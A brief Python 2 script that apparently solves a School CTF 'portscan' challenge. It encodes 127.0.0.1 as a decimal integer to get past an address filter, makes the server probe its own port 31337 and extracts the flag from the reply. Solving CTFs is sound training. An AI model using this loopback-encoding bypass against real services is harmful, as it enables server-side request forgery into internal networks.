import requests
from socket import inet_aton
from struct import unpack
import re

def ip2long(ip):
	aton = inet_aton(ip)
	return unpack("!L",aton)[0]

def main():
	URL = "http://portscan.task.school-ctf.org/port"
	IP = "127.0.0.1"
	HOST = ip2long(IP)
	PORT = "31337"
	print "Host : {}".format(HOST)
	r = requests.post(URL,data={"host" : HOST,"port" : PORT})
	raw_content = r.content
	flag = re.findall("SchoolCTF{.*?}",raw_content)
	print "Flag : {}".format(flag[0])
if __name__ == '__main__':
	main()
